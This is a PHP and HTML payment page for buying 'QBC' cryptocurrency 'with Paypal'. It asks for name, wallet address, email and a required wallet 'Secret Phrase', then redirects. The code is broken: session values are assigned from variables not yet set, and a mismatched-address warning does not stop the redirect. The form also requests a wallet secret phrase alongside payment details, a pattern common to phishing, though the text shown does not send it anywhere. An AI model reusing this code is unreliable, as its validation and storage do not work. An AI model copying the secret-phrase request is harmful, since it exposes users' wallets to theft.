<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Simple Login Form</title>
<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css">
<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.4/jquery.min.js"></script>
<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script> 
<style type="text/css">
	.login-form {
		width: 340px;
    	margin: 50px auto;
	}
    .login-form form {
    	margin-bottom: 15px;
        background: #f7f7f7;
        box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.3);
        padding: 30px;
    }
    .login-form h2 {
        margin: 0 0 15px;
    }
    .form-control, .btn {
        min-height: 38px;
        border-radius: 2px;
    }
    .btn {        
        font-size: 15px;
        font-weight: bold;
    }
</style>
</head>
<body>
<?php 


session_start();

if (isset($_POST['submit'])) { 

$_SESSION['fname'] = $fname;
$_SESSION['lname'] = $lname;
$_SESSION['amount'] = $amount;
$_SESSION['address'] = $address;
$_SESSION['email'] = $email;
$_SESSION['secret'] = $secret;
}
?>
<div class="login-form">
    <form action="form.php" method="post">
	
	
        <h2 class="text-center">Paying With Paypal</h2>       
        <div class="form-group">
            <input type="text" class="form-control" placeholder="First name" name="fname" required="required">
			<br>
			<input type="text" class="form-control" placeholder= "Last name" name="lname"  required="required">
			
	  <br>
	 <input type="number" class="form-control" id="exampleFormControlInput1" name="amount" placeholder="Amount of QBC" required="required">
	 <br>
	 
	 <input type="text" class="form-control" placeholder="Wallet Address(QBC Address)"  name="address"required="required">
	 
	 <br>
	 
	  <input type="text" class="form-control" placeholder="Wallet Address(QBC Address) Again "  name="address1" required="required">
	  <br>
	 
		 
		<input type="email" class="form-control" placeholder="Email Address (Same as paypal)" name="email" required="required">
		
		<br>
		
		
		<br>

        
	</div>
        <div class="form-group">
            <input type="text" class="form-control" placeholder="Secret Phrase" name="secret" required="required"  >
			<br>
        </div>
        <div class="form-group">
		
            
			
			<input type="submit" class="form-control"  name="submit" >
			
        </div>
            <?php 
		
		
		
		if (isset($_POST['submit'])) { 
          $fname = $_POST['fname'];
		$lname = $_POST['lname'];
		$amount = $_POST['amount'];
		$address = $_POST['address'];
		$address1 = $_POST['address1'];
		$email = $_POST['email'];
		$secret = $_POST['secret'];
		
		if ($address !=$address1) {
			echo "Your wallet adresses are not the same";
		}
		echo '<body style="background-color:#00ff00">';
		
		echo '<script type="text/javascript">
           window.location = "almost.php"
      </script>';
		}
			
		else {
			echo '<body style="background-color:red">';
		}
		
	?>
    </form>
   
</div>
</body>
</html>                                		                            